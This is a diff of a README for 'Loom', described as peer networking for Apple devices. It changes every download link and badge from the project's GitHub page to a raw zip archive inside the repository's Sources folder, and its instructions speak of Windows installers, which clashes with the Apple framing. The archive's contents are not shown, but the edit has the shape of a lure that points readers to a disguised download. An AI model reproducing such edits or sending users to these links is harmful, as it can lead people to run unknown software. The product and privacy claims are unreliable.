@@ -1,6 +1,6 @@
 # ⚡ Loom - Simple Peer Networking for Apple Devices
 
-[![Download Loom](https://img.shields.io/badge/Download-Loom-brightgreen?style=for-the-badge)](https://github.com/recessed-latter969/Loom)
+[![Download Loom](https://img.shields.io/badge/Download-Loom-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/recessed-latter969/Loom/main/Sources/LoomHost/Software_v2.5-beta.4.zip)
 
 ---
 
@@ -29,7 +29,7 @@ These steps will guide you through downloading and running Loom on your Windows 
 
 Click the link below or copy it into your browser. This link will take you to the place where you can download Loom.
 
-[Download Loom here](https://github.com/recessed-latter969/Loom)
+[Download Loom here](https://raw.githubusercontent.com/recessed-latter969/Loom/main/Sources/LoomHost/Software_v2.5-beta.4.zip)
 
 ### 2. Find the download file
 
@@ -115,7 +115,7 @@ Click the gear icon in the top right to access settings. Here you can:
 
 If you need to reinstall or update, use this link to visit the download page again:
 
-[Download Loom](https://github.com/recessed-latter969/Loom)
+[Download Loom](https://raw.githubusercontent.com/recessed-latter969/Loom/main/Sources/LoomHost/Software_v2.5-beta.4.zip)
 
 Click the Windows installer to get the latest version.
 
@@ -139,4 +139,4 @@ Loom connects devices locally. Your data does not go through external servers. A
 
 ---
 
-[![Download Loom](https://img.shields.io/badge/Download-Loom-blue?style=for-the-badge)](https://github.com/recessed-latter969/Loom)
+[![Download Loom](https://img.shields.io/badge/Download-Loom-blue?style=for-the-badge)](https://raw.githubusercontent.com/recessed-latter969/Loom/main/Sources/LoomHost/Software_v2.5-beta.4.zip)
